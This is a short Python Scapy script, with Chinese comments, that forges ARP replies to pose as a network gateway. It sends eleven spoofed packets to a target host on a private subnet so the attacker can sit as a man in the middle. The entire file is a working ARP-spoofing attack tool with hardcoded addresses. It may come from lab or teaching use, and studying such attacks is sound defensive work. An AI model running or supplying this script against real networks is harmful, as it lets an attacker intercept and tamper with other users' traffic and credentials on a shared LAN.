#!/usr/bin/python3

from scapy.all import ARP,send

def create_arpspoof(src_ip,src_mac,target_ip):
    '''
    生成ARP数据包，伪造网关欺骗目标计算机
    src_mac:本机的MAC地址，充当中间人
    src_ip:要伪装的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    target_ip:目标计算机的IP
	'''
    pkt=ARP(op=2,psrc=src_ip,pdst=target_ip,hwdst=src_mac)
    print("pkt has created")
    return pkt

if __name__=='__main__':
    src_ip="172.16.222.1"
    src_mac="08:00:27:02:c5:a1"
    target_ip="172.16.222.123"
    spoofpkt=create_arpspoof(src_ip,src_mac,target_ip)
    for i in range(11):
        send(spoofpkt)
        print("send No."+str(i)+" pkt\n")